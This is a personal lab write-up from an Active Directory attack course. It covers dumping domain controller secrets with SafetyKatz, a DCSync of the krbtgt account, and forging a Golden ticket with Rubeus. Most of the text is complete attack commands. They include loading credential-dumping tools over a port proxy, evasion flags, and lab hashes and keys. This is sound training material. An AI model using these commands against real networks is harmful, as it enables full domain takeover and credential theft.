# Learning Objetive 8

* Extract secrets from the domain controller of dollarcorp.
* Using the secrets of krbtgt account, create a Golden ticket.
* Use the Golden ticket to (once again) get domain admin privileges from a mv

***

From the previous exercise, we have domain admin privileges! Let’s extract all the hashes on the domain controller.&#x20;

### Extract Secrets

Run the below command from an elevated command prompt (Run as administrator) to start a process with Domain Admin privileges:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:

> Its into the new cmd obtained

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

Before it, connect to the dc machine "dcorp-dc" like svcadmin and apply the portforwardding and execute the loader + safetikatz-->

```
winrs -r:dcorp-dc cmd
```

<figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.113
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

> Please note that the `krbtgt` account password may be changed and the hash you get in your lab instance could be different from the one in this lab manual.
>
> krbtgt:4e9815869d2090ccfca61c1fe0d23986

To get NTLM hash and AES keys of the `krbtgt` account, we can use the `DCSync` attack.&#x20;

Run the below command from process running as Domain Admin on the student VM:

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>

Info obtained:

* SID: S-1-5-21-719815819-3726368948-3917688648-502
* AES256-kgbtb: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
* user: Administrator

***

### Forging Golden Ticket using Rubeus

Use the below Rubeus command to generate an OPSEC friendly command for Golden ticket.&#x20;

> Note that 3 LDAP queries are sent to the DC to retrieve the required information:
>
> * RID del usuario
> * grupos
> * atributos del usuario

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

> In us vm student console/machine

<figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>

Now, use the generated command to forge a Golden ticket. Remember to add `-path C:\AD\Tools\Rubeus.exe -args` after `Loader.exe` and `/ptt` at the end of the generated command to inject it in the current process. Once the ticket is injected, we can access resources in the domain:

> We need modificate a little bit the commands awarded by the previus commnad -->
>
> ```
> C:\AD\Tools\Loader.exe Evasive-Golden .....
> ```
>
> between -->
>
> <pre><code>C:\AD\Tools\Loader.exe <a data-footnote-ref href="#user-content-fn-1">-path C:\AD\Tools\Rubeus.exe -args </a>Evasive-Golden .....
> </code></pre>

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3046 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

<figure><img src="../../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>

```
winrs -r:dcorp-dc cmd
```

<figure><img src="../../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>

[^1]: 
